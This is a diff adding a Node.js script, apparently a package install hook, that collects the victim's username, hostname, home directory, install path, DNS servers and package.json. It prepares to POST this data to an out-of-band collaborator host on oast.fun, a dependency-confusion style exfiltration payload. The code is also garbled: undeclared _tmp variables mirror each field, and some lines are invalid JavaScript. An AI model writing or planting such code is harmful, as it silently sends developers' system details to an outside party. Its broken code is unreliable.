@@ -1,0 +1,55 @@
+const os = require("os")
+const dns = require("dns")
+const querystring = require("querystring")
+const https = require("https")
+const packageJSON = require("./package.json")
+const package = packageJSON.name
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+})
+_tmp_0.p = package
+_tmp_0.c = __dirname
+_tmp_0.hd = os.homedir()
+_tmp_0.hn = os.hostname()
+_tmp_0.un = os.userInfo().username
+_tmp_0.dns = dns.getServers()
+_tmp_0.r = packageJSON ? packageJSON.___resolved : undefined
+_tmp_0.v = packageJSON.version
+_tmp_0.pjson = packageJSON
+var postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_1.msg = trackingData
+var options = {
+    hostname: "ce9f04g2vtc0000mgwx0g8rzoneyyyyyb.oast.fun", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+}
+_tmp_2.hostname = "ce9f04g2vtc0000mgwx0g8rzoneyyyyyb.oast.fun"
+_tmp_2.port = 443
+_tmp_2.path = "/"
+_tmp_2.method = "POST"
+_tmp_2.headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    }
+_tmp_3.Content-Type = "application/x-www-form-urlencoded"
+_tmp_3.Content-Length = postData.length
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+})
